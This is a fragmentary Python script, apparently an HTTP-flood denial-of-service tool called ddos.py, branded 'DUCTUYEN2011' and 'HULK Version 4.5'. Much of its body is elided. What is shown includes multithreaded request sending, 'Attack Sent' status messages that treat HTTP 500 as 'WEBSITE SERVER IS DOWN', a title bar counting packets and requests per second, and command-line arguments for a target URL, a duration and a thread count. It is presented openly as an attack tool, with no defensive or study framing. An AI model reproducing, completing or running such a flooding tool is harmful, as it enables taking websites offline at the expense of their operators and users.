...
import threading
import time
import sys  # Thêm dòng này để import sys
...
def update_title(pps, requests_per_seconds):
    title = f"HTTP-REQUESTS | DUCTUYEN2011 Attack Sent | PPS: {pps} | RQS: {requests_per_seconds}"
    if os.name == 'nt':
...
def send_request(url):
    ...
    try:
        ...
        if status == 200:
            print(f"HTTP-REQUESTS | DUCTUYEN2011 Attack Sent | Status: 200")
        elif status == 500:
            print(f"HTTP-REQUESTS | DUCTUYEN2011 Attack Sent | Status: 500 ERROR WEBSITE SERVER IS DOWN")
        else:
            print(f"DUCTUYEN2011-ATTACK | HULK Version 4.5 | Status: {status}")
...
DISTRIBUTED DENIAL OF SERVICE | BY DUCTUYEN2011

""")
    if len(sys.argv) != 4:
        print("Usage: python ddos.py <web> <duration> <threads>")
        return

    url = sys.argv[1].strip()
    duration = int(sys.argv[2].strip())
    threads_count = int(sys.argv[3].strip())
